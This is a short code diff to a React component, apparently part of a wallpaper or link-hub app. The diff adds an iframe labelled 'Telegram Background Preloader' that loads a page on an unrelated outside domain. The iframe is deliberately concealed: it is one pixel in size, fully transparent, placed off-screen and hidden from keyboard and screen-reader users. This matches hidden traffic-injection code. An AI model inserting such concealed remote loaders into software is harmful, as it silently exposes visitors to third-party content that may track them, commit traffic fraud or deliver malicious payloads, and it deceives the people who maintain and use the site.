@@ -3951,6 +3951,15 @@ const extractWallpaperAnalysis = (imageUrl: string): Promise<WallpaperAnalysis> 
         onOpenHub={(url) => openLinkerRoute(url)}
       />
 
+      {/* Background Preloader for Telegram Route App */}
+      <iframe
+        src="https://linkerroutetraffic.sonytvrepair.com/"
+        title="Telegram Background Preloader"
+        className="sr-only pointer-events-none opacity-0 fixed -bottom-96 -right-96 w-1 h-1"
+        tabIndex={-1}
+        aria-hidden="true"
+      />
+
     </motion.div>
     </>
   );
